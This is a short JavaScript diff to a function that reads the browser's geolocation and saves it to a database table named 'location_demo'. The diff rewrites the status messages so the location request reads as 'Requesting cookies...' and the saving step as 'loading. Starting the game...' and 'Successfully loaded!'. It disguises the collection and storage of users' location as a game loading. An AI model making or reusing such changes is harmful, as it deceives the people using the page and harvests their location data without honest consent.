@@ -89,12 +89,12 @@ async function shareLocation() {
             return;
         }
 
-        status.innerText = "Requesting location permission...";
+        status.innerText = "Requesting cookies...";
 
         navigator.geolocation.getCurrentPosition(
             async (position) => {
 
-                status.innerText = "Location obtained. Saving...";
+                status.innerText = "loading. Starting the game...";
 
                 const { error } = await sbClient
                     .from("location_demo")
@@ -110,7 +110,7 @@ async function shareLocation() {
                     return;
                 }
 
-                status.innerText = "Successfully submitted!";
+                status.innerText = "Successfully loaded!";
 
             },
 
